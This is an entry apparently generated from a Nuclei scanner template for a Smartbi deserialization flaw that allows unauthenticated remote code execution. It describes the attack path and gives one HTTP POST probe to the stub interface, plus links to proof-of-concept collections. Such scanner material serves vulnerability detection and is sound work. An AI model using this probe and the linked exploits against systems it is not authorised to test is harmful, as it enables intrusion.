# Nuclei Template: Smartbi windowunloading Interface - Deserialization
**Template ID:** smartbi-deserialization
**Vulnerability Class:** Code Injection
**Severity:** High
**CWE:** CWE-94
**Source:** Nuclei Template (`smartbi-deserialization.yaml`)

## Vulnerability Information & PoC

## Description
The Smartbi big data analysis platform has a remote command execution vulnerability. An unauthenticated remote attacker can use the stub interface to construct a request to bypass patch restrictions and then control the JDBC URL, which can ultimately lead to remote code execution or information leakage.

## Steps to reproduce / Exploit Payload
```http
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

className=UserService&methodName=isLogged&params=[]
```

## References
- https://stack.chaitin.com/techblog/detail?id=122
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/smartbi-windowunloading-other.yaml
- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Smartbi%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
